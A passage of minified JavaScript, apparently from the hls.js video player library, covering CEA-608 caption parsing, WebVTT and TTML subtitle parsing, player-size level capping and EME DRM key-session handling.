e=this.logger.time;null!==e&&this.outputFilter&&(null!==this.cueStartTime||this.displayedMemory.isEmpty()?this.displayedMemory.equals(this.lastOutputScreen)||(this.outputFilter.newCue(this.cueStartTime,e,this.lastOutputScreen),t&&this.outputFilter.dispatchCue&&this.outputFilter.dispatchCue(),this.cueStartTime=this.displayedMemory.isEmpty()?null:e):this.cueStartTime=e,this.lastOutputScreen.copy(this.displayedMemory))}cueSplitAtTime(t){!this.outputFilter||this.displayedMemory.isEmpty()||(this.outputFilter.newCue&&this.outputFilter.newCue(this.cueStartTime,t,this.displayedMemory),this.cueStartTime=t)}}class yi{constructor(t,e,r){this.channels=void 0,this.currentChannel=0,this.cmdHistory=void 0,this.logger=void 0;var n=new ci;this.channels=[null,new mi(t,e,n),new mi(t+1,r,n)],this.cmdHistory={a:null,b:null},this.logger=n}getHandler(t){return this.channels[t].getHandler()}setHandler(t,e){this.channels[t].setHandler(e)}addData(t,e){let r,n=!1;this.logger.time=t;for(let t=0;t<e.length;t+=2){var i,a=127&e[t],s=127&e[t+1];0==a&&0==s||(this.logger.log(3,"["+di([e[t],e[t+1]])+"] -> ("+di([a,s])+")"),(r=(r=(r=(r=this.parseCmd(a,s))||this.parseMidrow(a,s))||this.parsePAC(a,s))||this.parseBackgroundAttributes(a,s))||(n=this.parseChars(a,s))&&((i=this.currentChannel)&&0<i?this.channels[i].insertChars(n):this.logger.log(2,"No channel found yet. TEXT-MODE?")),r)||n||this.logger.log(2,"Couldn't parse cleaned data "+di([a,s])+" orig: "+di([e[t],e[t+1]]))}}parseCmd(t,e){var r,n,i=this.cmdHistory;return((20===t||28===t||21===t||29===t)&&32<=e&&e<=47||(23===t||31===t)&&33<=e&&e<=35)&&(Ti(t,e,i)?(Ei(null,null,i),this.logger.log(3,"Repeated command ("+di([t,e])+") is dropped")):(n=this.channels[r=20===t||21===t||23===t?1:2],20===t||21===t||28===t||29===t?32===e?n.ccRCL():33===e?n.ccBS():34===e?n.ccAOF():35===e?n.ccAON():36===e?n.ccDER():37===e?n.ccRU(2):38===e?n.ccRU(3):39===e?n.ccRU(4):40===e?n.ccFON():41===e?n.ccRDC():42===e?n.ccTR():43===e?n.ccRTD():44===e?n.ccEDM():45===e?n.ccCR():46===e?n.ccENM():47===e&&n.ccEOC():n.ccTO(e-32),Ei(t,e,i),this.currentChannel=r),!0)}parseMidrow(t,e){let r=0;var n;return(17===t||25===t)&&32<=e&&e<=47&&((r=17===t?1:2)!==this.currentChannel?(this.logger.log(0,"Mismatch channel in midrow parsing"),!1):!!(n=this.channels[r])&&(n.ccMIDROW(e),this.logger.log(3,"MIDROW ("+di([t,e])+")"),!0))}parsePAC(t,e){let r;var n=this.cmdHistory;if(!((17<=t&&t<=23||25<=t&&t<=31)&&64<=e&&e<=127||(16===t||24===t)&&64<=e&&e<=95))return!1;if(Ti(t,e,n))Ei(null,null,n);else{var i=t<=23?1:2,a=(r=(64<=e&&e<=95?1==i?si:li:1==i?oi:ui)[t],this.channels[i]);if(!a)return!1;a.setPAC(this.interpretPAC(r,e)),Ei(t,e,n),this.currentChannel=i}return!0}interpretPAC(t,e){let r;return r=95<e?e-96:e-64,(t={color:null,italics:!1,indent:null,underline:!1,row:t}).underline=!(1&~r),r<=13?t.color=["white","green","blue","cyan","red","yellow","magenta","white"][Math.floor(r/2)]:r<=15?(t.italics=!0,t.color="white"):t.indent=4*Math.floor((r-16)/2),t}parseChars(t,e){let r,n=null,i=null;if(17<=(i=25<=t?(r=2,t-8):(r=1,t))&&i<=19){let t;t=17===i?e+80:18===i?e+112:e+144,this.logger.log(2,"Special char '"+ni(t)+"' in channel "+r),n=[t]}else 32<=t&&t<=127&&(n=0===e?[t]:[t,e]);var a;return n&&(a=di(n),this.logger.log(3,"Char codes =  "+a.join(",")),Ei(t,e,this.cmdHistory)),n}parseBackgroundAttributes(t,e){var r,n;return((16===t||24===t)&&32<=e&&e<=47||(23===t||31===t)&&45<=e&&e<=47)&&(n={},16===t||24===t?(r=Math.floor((e-32)/2),n.background=hi[r],e%2==1&&(n.background=n.background+"_semi")):45===e?n.background="transparent":(n.foreground="black",47===e&&(n.underline=!0)),this.channels[t<=23?1:2].setBkgData(n),Ei(t,e,this.cmdHistory),!0)}reset(){for(let t=0;t<Object.keys(this.channels).length;t++){var e=this.channels[t];e&&e.reset()}this.cmdHistory={a:null,b:null}}cueSplitAtTime(e){for(let t=0;t<this.channels.length;t++){var r=this.channels[t];r&&r.cueSplitAtTime(e)}}}function Ei(t,e,r){r.a=t,r.b=e}function Ti(t,e,r){return r.a===t&&r.b===e}class Ai{constructor(t,e){this.timelineController=void 0,this.cueRanges=[],this.trackName=void 0,this.startTime=null,this.endTime=null,this.screen=null,this.timelineController=t,this.trackName=e}dispatchCue(){null!==this.startTime&&(this.timelineController.addCues(this.trackName,this.startTime,this.endTime,this.screen,this.cueRanges),this.startTime=null)}newCue(t,e,r){(null===this.startTime||this.startTime>t)&&(this.startTime=t),this.endTime=e,this.screen=r,this.timelineController.createCaptionsTrack(this.trackName)}reset(){this.cueRanges=[],this.startTime=null}}var _i=function(){if("undefined"!=typeof self&&self.VTTCue)return self.VTTCue;const E=["","lr","rl"],e=["start","middle","end","left","right"];function T(t,e){return"string"==typeof e&&!!Array.isArray(t)&&(e=e.toLowerCase(),!!~t.indexOf(e))&&e}function b(t){return T(e,t)}function A(t){let e=1;for(;e<arguments.length;e++){var r=arguments[e];for(const n in r)t[n]=r[n]}return t}function t(t,e,r){var n=this,i={enumerable:!0};n.hasBeenReset=!1;let a="",s=!1,o=t,l=e,u=r,h=null,c="",d=!0,f="auto",p="start",g=50,v="middle",m=50,y="middle";Object.defineProperty(n,"id",A({},i,{get:function(){return a},set:function(t){a=""+t}})),Object.defineProperty(n,"pauseOnExit",A({},i,{get:function(){return s},set:function(t){s=!!t}})),Object.defineProperty(n,"startTime",A({},i,{get:function(){return o},set:function(t){if("number"!=typeof t)throw new TypeError("Start time must be set to a number.");o=t,this.hasBeenReset=!0}})),Object.defineProperty(n,"endTime",A({},i,{get:function(){return l},set:function(t){if("number"!=typeof t)throw new TypeError("End time must be set to a number.");l=t,this.hasBeenReset=!0}})),Object.defineProperty(n,"text",A({},i,{get:function(){return u},set:function(t){u=""+t,this.hasBeenReset=!0}})),Object.defineProperty(n,"region",A({},i,{get:function(){return h},set:function(t){h=t,this.hasBeenReset=!0}})),Object.defineProperty(n,"vertical",A({},i,{get:function(){return c},set:function(t){if(!1===(t=T(E,t)))throw new SyntaxError("An invalid or illegal string was specified.");c=t,this.hasBeenReset=!0}})),Object.defineProperty(n,"snapToLines",A({},i,{get:function(){return d},set:function(t){d=!!t,this.hasBeenReset=!0}})),Object.defineProperty(n,"line",A({},i,{get:function(){return f},set:function(t){if("number"!=typeof t&&"auto"!==t)throw new SyntaxError("An invalid number or illegal string was specified.");f=t,this.hasBeenReset=!0}})),Object.defineProperty(n,"lineAlign",A({},i,{get:function(){return p},set:function(t){if(!(t=b(t)))throw new SyntaxError("An invalid or illegal string was specified.");p=t,this.hasBeenReset=!0}})),Object.defineProperty(n,"position",A({},i,{get:function(){return g},set:function(t){if(t<0||100<t)throw new Error("Position must be between 0 and 100.");g=t,this.hasBeenReset=!0}})),Object.defineProperty(n,"positionAlign",A({},i,{get:function(){return v},set:function(t){if(!(t=b(t)))throw new SyntaxError("An invalid or illegal string was specified.");v=t,this.hasBeenReset=!0}})),Object.defineProperty(n,"size",A({},i,{get:function(){return m},set:function(t){if(t<0||100<t)throw new Error("Size must be between 0 and 100.");m=t,this.hasBeenReset=!0}})),Object.defineProperty(n,"align",A({},i,{get:function(){return y},set:function(t){if(!(t=b(t)))throw new SyntaxError("An invalid or illegal string was specified.");y=t,this.hasBeenReset=!0}})),n.displayState=void 0}return t.prototype.getCueAsHTML=function(){return self.WebVTT.convertCueToDOMTree(self,this.text)},t}();class Si{decode(t,e){if(!t)return"";if("string"!=typeof t)throw new Error("Error - expected string data.");return decodeURIComponent(encodeURIComponent(t))}}function Li(t){function e(t,e,r,n){return 3600*(0|t)+60*(0|e)+(0|r)+parseFloat(n||0)}return(t=t.match(/^(?:(\d+):)?(\d{2}):(\d{2})(\.\d+)?/))?59<parseFloat(t[2])?e(t[2],t[3],0,t[4]):e(t[1],t[2],t[3],t[4]):null}class ki{constructor(){this.values=Object.create(null)}set(t,e){this.get(t)||""===e||(this.values[t]=e)}get(t,e,r){return r?this.has(t)?this.values[t]:e[r]:this.has(t)?this.values[t]:e}has(t){return t in this.values}alt(e,r,n){for(let t=0;t<n.length;++t)if(r===n[t]){this.set(e,r);break}}integer(t,e){/^-?\d+$/.test(e)&&this.set(t,parseInt(e,10))}percent(t,e){return!!(/^([\d]{1,3})(\.[\d]*)?%$/.test(e)&&0<=(e=parseFloat(e))&&e<=100)&&(this.set(t,e),!0)}}function Ri(t,e,r,n){var i,a=n?t.split(n):[t];for(const s in a)"string"==typeof a[s]&&2===(i=a[s].split(r)).length&&e(i[0],i[1])}const wi=new _i(0,0,""),Ii="middle"===wi.align?"middle":"center";function Di(t){return t.replace(/<br(?: \/)?>/gi,"\n")}class Ci{constructor(){this.state="INITIAL",this.buffer="",this.decoder=new Si,this.regionList=[],this.cue=null,this.oncue=void 0,this.onparsingerror=void 0,this.onflush=void 0}parse(t){const n=this;function r(){var t=n.buffer;let e=0;for(t=Di(t);e<t.length&&"\r"!==t[e]&&"\n"!==t[e];)++e;var r=t.slice(0,e);return"\r"===t[e]&&++e,"\n"===t[e]&&++e,n.buffer=t.slice(e),r}t&&(n.buffer+=n.decoder.decode(t,{stream:!0}));try{let t="";if("INITIAL"===n.state){if(!/\r\n|\n/.test(n.buffer))return this;var i=(t=r()).match(/^(ï»¿)?WEBVTT([ \t].*)?$/);if(null==i||!i[0])throw new Error("Malformed WebVTT signature.");n.state="HEADER"}let e=!1;for(;n.buffer;){if(!/\r\n|\n/.test(n.buffer))return this;switch(e?e=!1:t=r(),n.state){case"HEADER":/:/.test(t)?Ri(t,(function(t,e){}),/:/):t||(n.state="ID");continue;case"NOTE":t||(n.state="ID");continue;case"ID":if(/^NOTE($|[ \t])/.test(t)){n.state="NOTE";break}if(!t)continue;if(n.cue=new _i(0,0,""),n.state="CUE",-1===t.indexOf("--\x3e")){n.cue.id=t;continue}case"CUE":if(!n.cue){n.state="BADCUE";continue}try{!function(r,n,i){const e=r;function t(){var t=Li(r);if(null===t)throw new Error("Malformed timestamp: "+e);return r=r.replace(/^[^\sa-zA-Z-]+/,""),t}function a(){r=r.replace(/^\s+/,"")}if(a(),n.startTime=t(),a(),"--\x3e"!==r.slice(0,3))throw new Error("Malformed time stamp (time stamps must be separated by '--\x3e'): "+e);r=r.slice(3),a(),n.endTime=t(),a();{var s=r;const o=new ki;Ri(s,(function(e,r){let t;switch(e){case"region":for(let t=i.length-1;0<=t;t--)if(i[t].id===r){o.set(e,i[t].region);break}break;case"vertical":o.alt(e,r,["rl","lr"]);break;case"line":t=r.split(","),o.integer(e,t[0]),o.percent(e,t[0])&&o.set("snapToLines",!1),o.alt(e,t[0],["auto"]),2===t.length&&o.alt("lineAlign",t[1],["start",Ii,"end"]);break;case"position":t=r.split(","),o.percent(e,t[0]),2===t.length&&o.alt("positionAlign",t[1],["start",Ii,"end","line-left","line-right","auto"]);break;case"size":o.percent(e,r);break;case"align":o.alt(e,r,["start",Ii,"end","left","right"])}}),/:/,/\s/),n.region=o.get("region",null),n.vertical=o.get("vertical","");let t=o.get("line","auto"),e=("auto"===t&&-1===wi.line&&(t=-1),n.line=t,n.lineAlign=o.get("lineAlign","start"),n.snapToLines=o.get("snapToLines",!0),n.size=o.get("size",100),n.align=o.get("align",Ii),o.get("position","auto"));"auto"===e&&50===wi.position&&(e="start"===n.align||"left"===n.align?0:"end"===n.align||"right"===n.align?100:50),n.position=e}}(t,n.cue,n.regionList)}catch(t){n.cue=null,n.state="BADCUE";continue}n.state="CUETEXT";continue;case"CUETEXT":var a=-1!==t.indexOf("--\x3e");if(!t||a&&(e=!0)){n.oncue&&n.cue&&n.oncue(n.cue),n.cue=null,n.state="ID";continue}if(null===n.cue)continue;n.cue.text&&(n.cue.text+="\n"),n.cue.text+=t;continue;case"BADCUE":t||(n.state="ID")}}}catch(t){"CUETEXT"===n.state&&n.cue&&n.oncue&&n.oncue(n.cue),n.cue=null,n.state="INITIAL"===n.state?"BADWEBVTT":"BADCUE"}return this}flush(){var e=this;try{if(!e.cue&&"HEADER"!==e.state||(e.buffer+="\n\n",e.parse()),"INITIAL"===e.state||"BADWEBVTT"===e.state)throw new Error("Malformed WebVTT signature.")}catch(t){e.onparsingerror&&e.onparsingerror(t)}return e.onflush&&e.onflush(),this}}function Pi(t,e,r=0){return t.slice(r,r+e.length)===e}const xi=/\r\n|\n\r|\n|\r/g,Oi=function(t){let e=5381,r=t.length;for(;r;)e=33*e^t.charCodeAt(--r);return(e>>>0).toString()};function Mi(t,e,r){return Oi(t.toString())+Oi(e.toString())+Oi(r)}const Ni="stpp.ttml.im1t",Bi=/^(\d{2,}):(\d{2}):(\d{2}):(\d{2})\.?(\d+)?$/,Ui=/^(\d*(?:\.\d*)?)(h|m|s|ms|f|t)$/,ji={left:"start",center:"center",right:"end",start:"start",end:"end"};function Gi(t,e,r,n){if(0===(t=w(new Uint8Array(t),["mdat"])).length)n(new Error("Could not parse IMSC1 mdat"));else{var i,a,s;t=t.map((t=>T(t)));[e,i,a=1,s=!1]=[e.baseTime,1,e.timescale];const o=bn(e,i,1/a,s);try{t.forEach((t=>r(function(t,a){const n=(new DOMParser).parseFromString(t,"text/xml").getElementsByTagName("tt")[0];if(!n)throw new Error("Invalid ttml");const i={frameRate:30,subFrameRate:1,frameRateMultiplier:0,tickRate:0},s=Object.keys(i).reduce(((t,e)=>(t[e]=n.getAttribute("ttp:"+e)||i[e],t)),{}),o="preserve"!==n.getAttribute("xml:space"),l=Ki($i(n,"styling","style")),u=Ki($i(n,"layout","region")),h=$i(n,"body","[begin]");return[].map.call(h,(t=>{var e=function n(t,i){return[].slice.call(t.childNodes).reduce(((t,e,r)=>"br"===e.nodeName&&r?t+"\n":null!=(r=e.childNodes)&&r.length?n(e,i):i?t+e.textContent.trim().replace(/\s+/g," "):t+e.textContent),"")}(t,o);if(!e||!t.hasAttribute("begin"))return null;var r=Wi(t.getAttribute("begin"),s),n=Wi(t.getAttribute("dur"),s);let i=Wi(t.getAttribute("end"),s);if(null===r)throw Vi(t);if(null===i){if(null===n)throw Vi(t);i=r+n}return(n=new _i(r-a,i-a,e)).id=Mi(n.startTime,n.endTime,n.text),e=function(n,i,t){const a="http://www.w3.org/ns/ttml#styling";let s=null;var e=null!=n&&n.hasAttribute("style")?n.getAttribute("style"):null;return e&&t.hasOwnProperty(e)&&(s=t[e]),["displayAlign","textAlign","color","backgroundColor","fontSize","fontFamily"].reduce(((t,e)=>{var r=Hi(i,a,e)||Hi(n,a,e)||Hi(s,a,e);return r&&(t[e]=r),t}),{})}(r=u[t.getAttribute("region")],l[t.getAttribute("style")],l),(r=e.textAlign)&&((t=ji[r])&&(n.lineAlign=t),n.align=r),G(n,e),n})).filter((t=>null!==t))}(t,o))))}catch(t){n(t)}}}function $i(t,e,r){return(t=t.getElementsByTagName(e)[0])?[].slice.call(t.querySelectorAll(r)):[]}function Ki(t){return t.reduce(((t,e)=>{var r=e.getAttribute("xml:id");return r&&(t[r]=e),t}),{})}function Hi(t,e,r){return t&&t.hasAttributeNS(e,r)?t.getAttributeNS(e,r):null}function Vi(t){return new Error("Could not parse ttml timestamp "+t)}function Wi(t,e){if(!t)return null;let r=Li(t);var n,i,a;return null===r&&(Bi.test(t)?(n=t,i=e,a=(0|(n=Bi.exec(n))[4])+(0|n[5])/i.subFrameRate,r=3600*(0|n[1])+60*(0|n[2])+(0|n[3])+a/i.frameRate):Ui.test(t)&&(r=function(t,e){t=Ui.exec(t);var r=Number(t[1]);switch(t=t[2]){case"h":return 3600*r;case"m":return 60*r;case"ms":return 1e3*r;case"f":return r/e.frameRate;case"t":return r/e.tickRate}return r}(t,e))),r}class qi{constructor(t){this.hls=void 0,this.autoLevelCapping=void 0,this.firstLevel=void 0,this.media=void 0,this.restrictedLevels=void 0,this.timer=void 0,this.clientRect=void 0,this.streamController=void 0,this.hls=t,this.autoLevelCapping=Number.POSITIVE_INFINITY,this.firstLevel=-1,this.media=null,this.restrictedLevels=[],this.timer=void 0,this.clientRect=null,this.registerListeners()}setStreamController(t){this.streamController=t}destroy(){this.unregisterListener(),this.hls.config.capLevelToPlayerSize&&this.stopCapping(),this.media=null,this.clientRect=null,this.hls=this.streamController=null}registerListeners(){var t=this.hls;t.on($.FPS_DROP_LEVEL_CAPPING,this.onFpsDropLevelCapping,this),t.on($.MEDIA_ATTACHING,this.onMediaAttaching,this),t.on($.MANIFEST_PARSED,this.onManifestParsed,this),t.on($.BUFFER_CODECS,this.onBufferCodecs,this),t.on($.MEDIA_DETACHING,this.onMediaDetaching,this)}unregisterListener(){var t=this.hls;t.off($.FPS_DROP_LEVEL_CAPPING,this.onFpsDropLevelCapping,this),t.off($.MEDIA_ATTACHING,this.onMediaAttaching,this),t.off($.MANIFEST_PARSED,this.onManifestParsed,this),t.off($.BUFFER_CODECS,this.onBufferCodecs,this),t.off($.MEDIA_DETACHING,this.onMediaDetaching,this)}onFpsDropLevelCapping(t,e){e=this.hls.levels[e.droppedLevel],this.isLevelAllowed(e)&&this.restrictedLevels.push({bitrate:e.bitrate,height:e.height,width:e.width})}onMediaAttaching(t,e){this.media=e.media instanceof HTMLVideoElement?e.media:null,this.clientRect=null}onManifestParsed(t,e){var r=this.hls;this.restrictedLevels=[],this.firstLevel=e.firstLevel,r.config.capLevelToPlayerSize&&e.video&&this.startCapping()}onBufferCodecs(t,e){this.hls.config.capLevelToPlayerSize&&e.video&&this.startCapping()}onMediaDetaching(){this.stopCapping()}detectPlayerSize(){var t,e;this.media&&0<this.mediaHeight&&0<this.mediaWidth&&(t=this.hls.levels).length&&((e=this.hls).autoLevelCapping=this.getMaxLevel(t.length-1),e.autoLevelCapping>this.autoLevelCapping&&this.streamController&&this.streamController.nextLevelSwitch(),this.autoLevelCapping=e.autoLevelCapping)}getMaxLevel(r){var t=this.hls.levels;return t.length?(t=t.filter(((t,e)=>this.isLevelAllowed(t)&&e<=r)),this.clientRect=null,qi.getMaxLevelByMediaSize(t,this.mediaWidth,this.mediaHeight)):-1}startCapping(){this.timer||(this.autoLevelCapping=Number.POSITIVE_INFINITY,this.hls.firstLevel=this.getMaxLevel(this.firstLevel),self.clearInterval(this.timer),this.timer=self.setInterval(this.detectPlayerSize.bind(this),1e3),this.detectPlayerSize())}stopCapping(){this.restrictedLevels=[],this.firstLevel=-1,this.autoLevelCapping=Number.POSITIVE_INFINITY,this.timer&&(self.clearInterval(this.timer),this.timer=void 0)}getDimensions(){var t,e,r;return this.clientRect||(e={width:0,height:0},(t=this.media)&&(r=t.getBoundingClientRect(),e.width=r.width,e.height=r.height,e.width||e.height||(e.width=r.right-r.left||t.width||0,e.height=r.bottom-r.top||t.height||0)),this.clientRect=e)}get mediaWidth(){return this.getDimensions().width*this.contentScaleFactor}get mediaHeight(){return this.getDimensions().height*this.contentScaleFactor}get contentScaleFactor(){let t=1;if(!this.hls.config.ignoreDevicePixelRatio)try{t=self.devicePixelRatio}catch(t){}return t}isLevelAllowed(e){return!this.restrictedLevels.some((t=>e.bitrate===t.bitrate&&e.width===t.width&&e.height===t.height))}static getMaxLevelByMediaSize(e,r,n){if(null==e||!e.length)return-1;var i;let a=e.length-1;for(let t=0;t<e.length;t+=1){var s=e[t];if((s.width>=r||s.height>=n)&&(!(i=e[t+1])||s.width!==i.width||s.height!==i.height)){a=t;break}}return a}}const zi="[eme]";class Qi{constructor(t){this.hls=void 0,this.config=void 0,this.media=null,this.keyFormatPromise=null,this.keySystemAccessPromises={},this._requestLicenseFailureCount=0,this.mediaKeySessions=[],this.keyIdToKeySessionPromise={},this.setMediaKeysQueue=Qi.CDMCleanupPromise?[Qi.CDMCleanupPromise]:[],this.onMediaEncrypted=this._onMediaEncrypted.bind(this),this.onWaitingForKey=this._onWaitingForKey.bind(this),this.debug=V.debug.bind(V,zi),this.log=V.log.bind(V,zi),this.warn=V.warn.bind(V,zi),this.error=V.error.bind(V,zi),this.hls=t,this.config=t.config,this.registerListeners()}destroy(){this.unregisterListeners(),this.onMediaDetached();var t=this.config;t.requestMediaKeySystemAccessFunc=null,t.licenseXhrSetup=t.licenseResponseCallback=void 0,t.drmSystems=t.drmSystemOptions={},this.hls=this.onMediaEncrypted=this.onWaitingForKey=this.keyIdToKeySessionPromise=null,this.config=null}registerListeners(){this.hls.on($.MEDIA_ATTACHED,this.onMediaAttached,this),this.hls.on($.MEDIA_DETACHED,this.onMediaDetached,this),this.hls.on($.MANIFEST_LOADING,this.onManifestLoading,this),this.hls.on($.MANIFEST_LOADED,this.onManifestLoaded,this)}unregisterListeners(){this.hls.off($.MEDIA_ATTACHED,this.onMediaAttached,this),this.hls.off($.MEDIA_DETACHED,this.onMediaDetached,this),this.hls.off($.MANIFEST_LOADING,this.onManifestLoading,this),this.hls.off($.MANIFEST_LOADED,this.onManifestLoaded,this)}getLicenseServerUrl(t){var e,{drmSystems:e,widevineLicenseUrl:r}=this.config;if(e=e[t])return e.licenseUrl;if(t===p.WIDEVINE&&r)return r;throw new Error(`no license server URL configured for key-system "${t}"`)}getServerCertificateUrl(t){var e;if(e=(e=this.config.drmSystems)[t])return e.serverCertificateUrl;this.log(`No Server Certificate in config.drmSystems["${t}"]`)}attemptKeySystemAccess(t){var e=this.hls.levels,r=(t,e,r)=>!!t&&r.indexOf(t)===e;const s=e.map((t=>t.audioCodec)).filter(r),o=e.map((t=>t.videoCodec)).filter(r);return s.length+o.length===0&&o.push("avc1.42e01e"),new Promise(((n,i)=>{const a=e=>{const r=e.shift();this.getMediaKeysPromise(r,s,o).then((t=>n({keySystem:r,mediaKeys:t}))).catch((t=>{e.length?a(e):i(t instanceof h?t:new h({type:K.KEY_SYSTEM_ERROR,details:H.KEY_SYSTEM_NO_ACCESS,error:t,fatal:!0},t.message))}))};a(t)}))}requestMediaKeySystemAccess(t,e){var r=this.config.requestMediaKeySystemAccessFunc;if("function"==typeof r)return r(t,e);{let t="Configured requestMediaKeySystemAccess is not a function "+r;return null===Lt&&"http:"===self.location.protocol&&(t="navigator.requestMediaKeySystemAccess is not available over insecure protocol "+location.protocol),Promise.reject(new Error(t))}}getMediaKeysPromise(n,t,e){t=function(t,e,r,n){let i;switch(t){case p.FAIRPLAY:i=["cenc","sinf"];break;case p.WIDEVINE:case p.PLAYREADY:i=["cenc"];break;case p.CLEARKEY:i=["cenc","keyids"];break;default:throw new Error("Unknown key-system: "+t)}var s=n;return[{initDataTypes:i,persistentState:s.persistentState||"not-allowed",distinctiveIdentifier:s.distinctiveIdentifier||"not-allowed",sessionTypes:s.sessionTypes||[s.sessionType||"temporary"],audioCapabilities:e.map((t=>({contentType:`audio/mp4; codecs="${t}"`,robustness:s.audioRobustness||"",encryptionScheme:s.audioEncryptionScheme||null}))),videoCapabilities:r.map((t=>({contentType:`video/mp4; codecs="${t}"`,robustness:s.videoRobustness||"",encryptionScheme:s.videoEncryptionScheme||null})))}]}(n,t,e,this.config.drmSystemOptions);const r=this.keySystemAccessPromises[n];let i=null==r?void 0:r.keySystemAccess;if(i)return i.then((()=>r.mediaKeys));{this.log(`Requesting encrypted media "${n}" key-system access with config: `+JSON.stringify(t)),i=this.requestMediaKeySystemAccess(n,t);const a=this.keySystemAccessPromises[n]={keySystemAccess:i};return i.catch((t=>{this.log(`Failed to obtain access to key-system "${n}": `+t)})),i.then((t=>{this.log(`Access for key-system "${t.keySystem}" obtained`);const r=this.fetchServerCertificate(n);return this.log(`Create media-keys for "${n}"`),a.mediaKeys=t.createMediaKeys().then((e=>(this.log(`Media-keys created for "${n}"`),r.then((t=>t?this.setMediaKeysServerCertificate(e,n,t):e))))),a.mediaKeys.catch((t=>{this.error(`Failed to create media-keys for "${n}"}: `+t)})),a.mediaKeys}))}}createMediaKeySessionContext({decryptdata:t,keySystem:e,mediaKeys:r}){this.log(`Creating key-system session "${e}" keyId: `+g_hexDump(t.keyId||[]));var n=r.createSession();t={decryptdata:t,keySystem:e,mediaKeys:r,mediaKeysSession:n,keyStatus:"status-pending"};return this.mediaKeySessions.push(t),t}renewKeySession(t){var e,r,n=t.decryptdata;n.pssh?(e=this.createMediaKeySessionContext(t),r=this.getKeyIdString(n),this.keyIdToKeySessionPromise[r]=this.generateRequestWithPreferredKeySession(e,"cenc",n.pssh,"expired")):this.warn("Could not renew expired session. Missing pssh initData."),this.removeSession(t)}getKeyIdString(t){if(!t)throw new Error("Could not read keyId of undefined decryptdata");if(null===t.keyId)throw new Error("keyId is null");return g_hexDump(t.keyId)}updateKeySession(t,e){var r=t.mediaKeysSession;return this.log(`Updating key-session "${r.sessionId}" for keyID ${g_hexDump((null==(t=t.decryptdata)?void 0:t.keyId)||[])}\n      } (data length: ${e&&e.byteLength})`),r.update(e)}selectKeySystemFormat(t){var e=Object.keys(t.levelkeys||{});return this.keyFormatPromise||(this.log(`Selecting key-system from fragment (sn: ${t.sn} ${t.type}: ${t.level}) key formats `+e.join(", ")),this.keyFormatPromise=this.getKeyFormatPromise(e)),this.keyFormatPromise}getKeyFormatPromise(i){return new Promise(((r,n)=>{const e=St(this.config);var t=i.map(bt).filter((t=>!!t&&-1!==e.indexOf(t)));return this.getKeySystemSelectionPromise(t).then((({keySystem:t})=>{var e=_t(t);e?r(e):n(new Error(`Unable to find format for key-system "${t}"`))})).catch(n)}))}loadKey(t){const n=t.keyInfo.decryptdata;var e=this.getKeyIdString(n);const i=`(keyId: ${e} format: "${n.keyFormat}" method: ${n.method} uri: ${n.uri})`;this.log("Starting session for key "+i);let r=this.keyIdToKeySessionPromise[e];return r||(r=this.keyIdToKeySessionPromise[e]=this.getKeySystemForKeyPromise(n).then((({keySystem:e,mediaKeys:r})=>(this.throwIfDestroyed(),this.log(`Handle encrypted media sn: ${t.frag.sn} ${t.frag.type}: ${t.frag.level} using key `+i),this.attemptSetMediaKeys(e,r).then((()=>{this.throwIfDestroyed();var t=this.createMediaKeySessionContext({keySystem:e,mediaKeys:r,decryptdata:n});return this.generateRequestWithPreferredKeySession(t,"cenc",n.pssh,"playlist-key")})))))).catch((t=>this.handleError(t))),r}throwIfDestroyed(t=0){if(!this.hls)throw new Error("invalid state")}handleError(t){this.hls&&(this.error(t.message),t instanceof h?this.hls.trigger($.ERROR,t.data):this.hls.trigger($.ERROR,{type:K.KEY_SYSTEM_ERROR,details:H.KEY_SYSTEM_NO_KEYS,error:t,fatal:!0}))}getKeySystemForKeyPromise(t){var e=this.getKeyIdString(t);return(e=this.keyIdToKeySessionPromise[e])||(t=(e=bt(t.keyFormat))?[e]:St(this.config),this.attemptKeySystemAccess(t))}getKeySystemSelectionPromise(t){if(0===(t=t.length?t:St(this.config)).length)throw new h({type:K.KEY_SYSTEM_ERROR,details:H.KEY_SYSTEM_NO_CONFIGURED_LICENSE,fatal:!0},"Missing key-system license configuration options "+JSON.stringify({drmSystems:this.config.drmSystems}));return this.attemptKeySystemAccess(t)}_onMediaEncrypted(e){const{initDataType:a,initData:s}=e;if(this.debug(`"${e.type}" event: init data type: "${a}"`),null!==s){let i,t;if("sinf"===a&&this.config.drmSystems[p.FAIRPLAY]){e=v(new Uint8Array(s));try{var r=ft(JSON.parse(e).sinf),n=Vt(new Uint8Array(r));if(!n)return;i=n.subarray(8,24),t=p.FAIRPLAY}catch(t){return void this.warn('Failed to parse sinf "encrypted" event message initData')}}else{if(e=function(e){if(!(e instanceof ArrayBuffer)||e.byteLength<32)return null;var r={version:0,systemId:"",kids:null,data:null},t=new DataView(e),n=t.getUint32(0);if(e.byteLength!==n&&44<n)return null;if(1886614376!==t.getUint32(4))return null;if(r.version=t.getUint32(8)>>>24,1<r.version)return null;r.systemId=g_hexDump(new Uint8Array(e,12,16));var i=t.getUint32(28);if(0===r.version){if(n-32<i)return null;r.data=new Uint8Array(e,32,i)}else if(1===r.version){r.kids=[];for(let t=0;t<i;t++)r.kids.push(new Uint8Array(e,32+16*t,16))}return r}(s),null===e)return;0===e.version&&e.systemId===At&&e.data&&(i=e.data.subarray(8,24)),t=function(t){if(t===At)return p.WIDEVINE}(e.systemId)}if(t&&i){const c=g_hexDump(i);var{keyIdToKeySessionPromise:o,mediaKeySessions:l}=this;let e=o[c];for(let t=0;t<l.length;t++){const d=l[t];var u=d.decryptdata;if(!u.pssh&&u.keyId){var h=g_hexDump(u.keyId);if(c===h||-1!==u.uri.replace(/-/g,"").indexOf(c)){e=o[h],delete o[h],u.pssh=new Uint8Array(s),u.keyId=i,e=o[c]=e.then((()=>this.generateRequestWithPreferredKeySession(d,a,s,"encrypted-event-key-match")));break}}}(e=e||(o[c]=this.getKeySystemSelectionPromise([t]).then((({keySystem:e,mediaKeys:r})=>{var t;this.throwIfDestroyed();const n=new Zt("ISO-23001-7",c,null!=(t=_t(e))?t:"");return n.pssh=new Uint8Array(s),n.keyId=i,this.attemptSetMediaKeys(e,r).then((()=>{this.throwIfDestroyed();var t=this.createMediaKeySessionContext({decryptdata:n,keySystem:e,mediaKeys:r});return this.generateRequestWithPreferredKeySession(t,a,s,"encrypted-event-no-match")}))})))).catch((t=>this.handleError(t)))}}}_onWaitingForKey(t){this.log(`"${t.type}" event`)}attemptSetMediaKeys(t,e){const r=this.setMediaKeysQueue.slice(),n=(this.log(`Setting media-keys for "${t}"`),Promise.all(r).then((()=>{if(this.media)return this.media.setMediaKeys(e);throw new Error("Attempted to set mediaKeys without media element attached")})));return 